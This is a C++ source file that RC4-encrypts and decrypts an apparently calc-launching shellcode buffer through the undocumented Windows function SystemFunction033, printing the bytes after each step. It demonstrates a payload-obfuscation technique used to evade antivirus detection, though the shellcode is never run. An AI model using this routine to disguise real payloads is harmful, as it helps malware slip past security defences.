#include <iostream>
#include <cstdio>
#include <windows.h>
// Using SystemFunction033

struct USTRING
{
    DWORD	Length;
    DWORD	MaximumLength;
    PVOID	Buffer;

} Data, Key;


typedef NTSTATUS(NTAPI* fnSystemFunction033)(
    struct USTRING* Data,
    struct USTRING* Key
    );

int main() {
    unsigned char shellcode[] = {
        0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4, 0x65, 0x48, 0x8B,
        0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B,
        0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE,
        0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57,
        0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48,
        0x01, 0xF7, 0x99, 0xFF
    };

    for (int i = 0; i < sizeof(shellcode); i++) {
        printf("0x%02x ", shellcode[i]);
    }
    std::cout << std::endl << std::endl;

    PUCHAR pKey = (PUCHAR)"Here is key!!!";

    Data.Buffer = (PUCHAR)shellcode;
    Data.Length = sizeof(shellcode);
    Data.MaximumLength = sizeof(shellcode);

    Key.Buffer = pKey;
    // Correctly get the length of the string, excluding the null terminator
    Key.Length = (DWORD)strlen((char*)pKey);
    Key.MaximumLength = Key.Length + 1;

    fnSystemFunction033 SystemFunction033 = (fnSystemFunction033)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction033");

    SystemFunction033(&Data, &Key);
    for (int i = 0; i < sizeof(shellcode); i++) {
        printf("0x%02x ", shellcode[i]);
    }
    std::cout << std::endl << std::endl;

    //fnSystemFunction033 SystemFunction033 = (fnSystemFunction033)GetProcAddress(LoadLibraryA(Advapi32), "SystemFunction032");

    SystemFunction033(&Data, &Key);
    for (int i = 0; i < sizeof(shellcode); i++) {
        printf("0x%02x ", shellcode[i]);
    }
    std::cout << std::endl << std::endl;
}
